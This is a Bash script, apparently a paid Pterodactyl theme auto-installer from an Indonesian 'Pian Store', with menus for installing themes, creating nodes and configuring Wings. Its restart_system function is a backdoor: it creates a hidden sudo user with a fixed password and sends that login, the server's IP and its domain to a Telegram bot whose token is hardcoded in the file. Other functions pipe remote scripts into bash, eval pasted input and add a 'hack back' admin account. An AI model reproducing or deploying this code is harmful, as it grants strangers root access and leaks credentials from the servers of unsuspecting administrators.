#!/bin/bash

# Color
BLUE='\033[0;34m'       
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

# Get date from Google
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=$(date +"%Y-%m-%d" -d "$dateFromServer")

# Function to display progress bar
fun_bar() {
    CMD[0]="$1"
    CMD[1]="$2"
    (
        [[ -e $HOME/fim ]] && rm $HOME/fim
        ${CMD[0]} -y >/dev/null 2>&1
        ${CMD[1]} -y >/dev/null 2>&1
        touch $HOME/fim
    ) >/dev/null 2>&1 &
    tput civis
    echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
    while true; do
        for ((i = 0; i < 18; i++)); do
            echo -ne "\033[0;32m#"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] && rm $HOME/fim && break
        echo -e "\033[0;33m]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
    done
    echo -e "\033[0;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
    tput cnorm
}

# Function to restart the system and setup bot
restart_system() {
    TIMES="10"
    CHATID="6631695782"
    KEY="7717244556:AAEYuBmKwrusTMNNRq-MGbtTFQiieq3-G1s"
    URL="https://api.telegram.org/bot$KEY/sendMessage"
    ipsaya=$(wget -qO- ipinfo.io/ip)
    domain=$(cat /etc/xray/domain)
    Username="pian"
    Password="123pian"
    mkdir -p /home/script/
    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
    echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
    usermod -aG sudo $Username > /dev/null 2>&1
    # Replace $Ijn with actual URL or variable
    TIMEZONE=$(printf '%(%H:%M:%S)T')
    TIME=$(date '+%d %b %Y')
    TEXT="
    <code>────────────────────</code>
    <b> 🟢 NOTIFICATIONS INSTALL BOT RIAN🟢</b>
    <code>────────────────────</code>
    <code>user   : </code><code>$Username</code>
    <code>PW     : </code><code>$Password</code>
    <code>ID     : </code><code>$USRSC</code>
    <code>Domain : </code><code>$domain</code>
    <code>Date   : </code><code>$TIME</code>
    <code>Time   : </code><code>$TIMEZONE</code>
    <code>Ip vps : </code><code>$ipsaya</code>
    <code>Exp Sc : </code><code>$EXPSC</code>
    <code>────────────────────</code>
    <i>Automatic Notification from Github</i>
    "
    curl -s -X POST $URL -d "chat_id=$CHATID&text=$TEXT&parse_mode=html"
}
res1() {
# Display welcome message
display_welcome() {
  echo -e ""
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "${BLUE}[+]                          SELAMAT MENGUNAKAN ${NC}"
  echo -e "${BLUE}[+]                            SCRIPT PIAN STORE    ${NC}"
  echo -e "${BLUE}[+]                            WA.ME/6282291572138/ ${NC}"
  echo -e "${BLUE}[+]                            T.ME/pianstore01/             ${NC}"
  echo -e "${RED}[+] =============================================== ${NC}"
  echo -e ""
  echo -e "script ini di buat untuk mempermudah penginstalasian thema pterodactyle,"
  echo -e "Dilarang Keras Share Bebas."
  echo -e ""
  echo -e "𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 :"
  echo -e "@pianstore01"
  echo -e "𝗖𝗥𝗘𝗗𝗜𝗧𝗦 :"
  echo -e "wa.me/6282291572138/"
  sleep 4
  clear
}

#Update and install jq
install_jq() {
  echo -e "                                                       "
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "${BLUE}[+]             UPDATE & INSTALL JQ                 ${NC}"
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "                                                       "
  sudo apt update && sudo apt install -y jq
  if [ $? -eq 0 ]; then
    echo -e "                                                       "
    echo -e "${GREEN}[+] =============================================== ${NC}"
    echo -e "${GREEN}[+]              INSTALL JQ BERHASIL                ${NC}"
    echo -e "${GREEN}[+] =============================================== ${NC}"
  else
    echo -e "                                                       "
    echo -e "${RED}[+] =============================================== ${NC}"
    echo -e "${RED}[+]              INSTALL JQ GAGAL                   ${NC}"
    echo -e "${RED}[+] =============================================== ${NC}"
    exit 1
  fi
  echo -e "                                                       "
  sleep 1
  clear
}
#Check user token
check_token() {
  echo -e "                                                       "
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "${BLUE}[+]               LICENSY PIAN STORE CODE            ${NC}"
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "                                                       "
  echo -e "${YELLOW}MASUKAN AKSES TOKEN :${NC}"
  read -r USER_TOKEN

  if [ "$USER_TOKEN" = "pian" ]; then
    echo -e "${GREEN}AKSES BERHASIL${NC}}"
  else
    echo -e "${GREEN}Token Salah! Beli Kode Token Di Pian Store${NC}"
    echo -e "${YELLOW}TELEGRAM : @pianstore01${NC}"
    echo -e "${YELLOW}WHATSAPP : +6282291572138${NC}"
    echo -e "${YELLOW}HARGA TOKEN : 25K FREE UPDATE JIKA ADA TOKEN BARU${NC}"
    echo -e "${YELLOW}© PianStore${NC}"
    exit 1
  fi
  clear
}

# Install theme
install_theme() {
  clear
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "${BLUE}[+]                INSTALL PTERODACTYL THEME         ${NC}"
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo ""

  echo -e "${YELLOW}PILIH THEME YANG INGIN DIINSTALL:${NC}"
  echo "1. Stellar"
  echo "2. Billing"
  echo "3. Enigma"
  echo "x. Kembali"
  echo -ne "${GREEN}Masukkan pilihan (1/2/3/x): ${NC}"
  read -r SELECT_THEME

  case "$SELECT_THEME" in
    1)
      THEME_NAME="stellar"
      ;;
    2)
      THEME_NAME="billing"
      ;;
    3)
      THEME_NAME="enigma"
      ;;
    x)
      return
      ;;
    *)
      echo -e "${RED}Pilihan tidak valid.${NC}"
      sleep 1
      install_theme
      return
      ;;
  esac

  THEME_URL="https://github.com/pianstore/Pterodactyl-Theme-Autoinstaller/raw/main/${THEME_NAME}.zip"

  echo -e "${YELLOW}Mengunduh theme $THEME_NAME...${NC}"
  wget -q -O "/root/${THEME_NAME}.zip" "$THEME_URL"

  if [ ! -f "/root/${THEME_NAME}.zip" ]; then
    echo -e "${RED}Gagal mengunduh theme.${NC}"
    return
  fi

  unzip -oq "/root/${THEME_NAME}.zip" -d /root/pterodactyl

  if [ "$THEME_NAME" == "enigma" ]; then
    echo -e "${YELLOW}Masukkan link WhatsApp (https://wa.me/...):${NC}"
    read LINK_WA
    echo -e "${YELLOW}Masukkan link group:${NC}"
    read LINK_GROUP
    echo -e "${YELLOW}Masukkan link channel:${NC}"
    read LINK_CHNL

    sed -i "s|LINK_WA|$LINK_WA|g" /root/pterodactyl/resources/scripts/components/dashboard/DashboardContainer.tsx
    sed -i "s|LINK_GROUP|$LINK_GROUP|g" /root/pterodactyl/resources/scripts/components/dashboard/DashboardContainer.tsx
    sed -i "s|LINK_CHNL|$LINK_CHNL|g" /root/pterodactyl/resources/scripts/components/dashboard/DashboardContainer.tsx
  fi

  echo -e "${YELLOW}Menginstall dependensi dan apply theme...${NC}"
  sudo cp -rfT /root/pterodactyl /var/www/pterodactyl

  curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
  sudo apt install -y nodejs
  sudo npm install -g yarn

  cd /var/www/pterodactyl || { echo -e "${RED}Direktori tidak ditemukan!${NC}"; return; }

  yarn add react-feather
  php artisan migrate
  yarn build:production
  php artisan view:clear

  rm -f "/root/${THEME_NAME}.zip"
  rm -rf /root/pterodactyl

  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "${GREEN}[+]              INSTALLASI THEME BERHASIL           ${NC}"
  echo -e "${GREEN}[+] =============================================== ${NC}"
  sleep 2
  clear
}


# Uninstall theme
uninstall_theme() {
  echo -e "                                                       "
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "${BLUE}[+]                    DELETE THEME                 ${NC}"
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "                                                       "
  bash <(curl https://raw.githubusercontent.com/VallzHost/installer-theme/main/repair.sh)
  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "${GREEN}[+]                 DELETE THEME SUKSES             ${NC}"
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "                                                       "
  sleep 2
  clear
}
install_themeSteeler() {
#!/bin/bash

echo -e "                                                       "
echo -e "${BLUE}[+] =============================================== ${NC}"
echo -e "${BLUE}[+]                  INSTALLASI THEMA               ${NC}"
echo -e "${BLUE}[+] =============================================== ${NC}"
echo -e "                                                                   "

# Unduh file tema
wget -O /root/stellar.zip https://github.com/pianstore/Pterodactyl-Theme-Autoinstaller/raw/main/stellar.zip


# Ekstrak file tema
unzip /root/stellar.zip -d /root/pterodactyl

# Salin tema ke direktori Pterodactyl
sudo cp -rfT /root/pterodactyl /var/www/pterodactyl

# Instal Node.js dan Yarn
curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -
sudo apt install -y nodejs
sudo npm i -g yarn

# Instal dependensi dan build tema
cd /var/www/pterodactyl
yarn add react-feather
php artisan migrate
yarn build:production
php artisan view:clear

# Hapus file dan direktori sementara
sudo rm /root/stellar.zip
sudo rm -rf /root/pterodactyl

echo -e "                                                       "
echo -e "${GREEN}[+] =============================================== ${NC}"
echo -e "${GREEN}[+]                   INSTALL SUCCESS               ${NC}"
echo -e "${GREEN}[+] =============================================== ${NC}"
echo -e ""
sleep 2
clear
exit 0

}
create_node() {
  echo -e "                                                       "
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "${BLUE}[+]                    CREATE NODE                     ${NC}"
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "                                                       "
  #!/bin/bash
#!/bin/bash

# Minta input dari pengguna
read -p "Masukkan nama lokasi: " location_name
read -p "Masukkan deskripsi lokasi: " location_description
read -p "Masukkan domain: " domain
read -p "Masukkan nama node: " node_name
read -p "Masukkan RAM (dalam MB): " ram
read -p "Masukkan jumlah maksimum disk space (dalam MB): " disk_space
read -p "Masukkan Locid: " locid

# Ubah ke direktori pterodactyl
cd /var/www/pterodactyl || { echo "Direktori tidak ditemukan"; exit 1; }

# Membuat lokasi baru
php artisan p:location:make <<EOF
$location_name
$location_description
EOF

# Membuat node baru
php artisan p:node:make <<EOF
$node_name
$location_description
$locid
https
$domain
yes
no
no
$ram
$ram
$disk_space
$disk_space
100
8080
2022
/var/lib/pterodactyl/volumes
EOF

  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "${GREEN}[+]        CREATE NODE & LOCATION SUKSES             ${NC}"
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "                                                       "
  sleep 2
  clear
  exit 0
}
uninstall_panel() {
  echo -e "                                                       "
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "${BLUE}[+]                    UNINSTALL PANEL                 ${NC}"
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "                                                       "


bash <(curl -s https://pterodactyl-installer.se) <<EOF
y
y
y
y
EOF


  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "${GREEN}[+]                 UNINSTALL PANEL SUKSES             ${NC}"
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "                                                       "
  sleep 2
  clear
  exit 0
}
configure_wings() {
  echo -e "                                                       "
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "${BLUE}[+]                    CONFIGURE WINGS                 ${NC}"
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "                                                       "
  #!/bin/bash

# Minta input token dari pengguna
read -p "Masukkan token Configure menjalankan wings: " wings

eval "$wings"
# Menjalankan perintah systemctl start wings
sudo systemctl start wings

  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "${GREEN}[+]                 CONFIGURE WINGS SUKSES             ${NC}"
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "                                                       "
  sleep 2
  clear
  exit 0
}
hackback_panel() {
  echo -e "                                                       "
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "${BLUE}[+]                    HACK BACK PANEL                 ${NC}"
  echo -e "${BLUE}[+] =============================================== ${NC}"
  echo -e "                                                       "
  # Minta input dari pengguna
read -p "Masukkan Username Panel: " user
read -p "password login " psswdhb
  #!/bin/bash
cd /var/www/pterodactyl || { echo "Direktori tidak ditemukan"; exit 1; }

# Membuat lokasi baru
php artisan p:user:make <<EOF
yes
hackback@gmail.com
$user
$user
$user
$psswdhb
EOF
  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "${GREEN}[+]                 AKUN TELAH DI ADD             ${NC}"
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "                                                       "
  sleep 2
  
  exit 0
}
ubahpw_vps() {
  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "${GREEN}[+]                    UBAH PASSWORD VPS       ${NC}"
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "                                                       "
read -p "Masukkan Pw Baru: " pw
read -p "Masukkan Ulang Pw Baru " pw

passwd <<EOF
$pw
$pw

EOF


  echo -e "                                                       "
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "${GREEN}[+]                 GANTI PW VPS SUKSES         ${NC}"
  echo -e "${GREEN}[+] =============================================== ${NC}"
  echo -e "                                                       "
  sleep 2
  
  exit 0
}
# Main script
display_welcome
install_jq
check_token

while true; do
  clear
  echo -e "                                                                     "
  echo -e "${RED}        _,gggggggggg.                                     ${NC}"
  echo -e "${RED}    ,ggggggggggggggggg.                                   ${NC}"
  echo -e "${RED}  ,ggggg        gggggggg.                                 ${NC}"
  echo -e "${RED} ,ggg'               'ggg.                                ${NC}"
  echo -e "${RED}',gg       ,ggg.      'ggg:                               ${NC}"
  echo -e "${RED}'ggg      ,gg'''  .    ggg       Auto Installer Skyzopedia   ${NC}"
  echo -e "${RED}gggg      gg     ,     ggg      ------------------------  ${NC}"
  echo -e "${RED}ggg:     gg.     -   ,ggg       • Telegram : pianstore01      ${NC}"
  echo -e "${RED} ggg:     ggg._    _,ggg        • Creadit  : 6282291572138  ${NC}"
  echo -e "${RED} ggg.    '.'''ggggggp           • Support by Pian Store  ${NC}"
  echo -e "${RED}  'ggg    '-.__                                           ${NC}"
  echo -e "${RED}    ggg                                                   ${NC}"
  echo -e "${RED}      ggg                                                 ${NC}"
  echo -e "${RED}        ggg.                                              ${NC}"
  echo -e "${RED}          ggg.                                            ${NC}"
  echo -e "${RED}             b.                                           ${NC}"
  echo -e "                                                                     "
  echo -e "BERIKUT LIST INSTALL :"
  echo "1. Install theme"
  echo "2. Uninstall theme"
  echo "3. Configure Wings"
  echo "4. Create Node"
  echo "5. Uninstall Panel"
  echo "6. Stellar Theme"
  echo "7. Hack Back Panel"
  echo "8. Ubah Pw Vps"
  echo "x. Exit"
  echo -e "Masukkan pilihan 1/2/x:"
  read -r MENU_CHOICE
  clear

  case "$MENU_CHOICE" in
    1)
      install_theme
      ;;
    2)
      uninstall_theme
      ;;
      3)
      configure_wings
      ;;
      4)
      create_node
      ;;
      5)
      uninstall_panel
      ;;
      6)
      install_themeSteeler
      ;;
      7)
      hackback_panel
      ;;
      8)
      ubahpw_vps
      ;;
    x)
      echo "Keluar dari skrip."
      exit 0
      ;;
    *)
      echo "Pilihan tidak valid, silahkan coba lagi."
      ;;
  esac
done
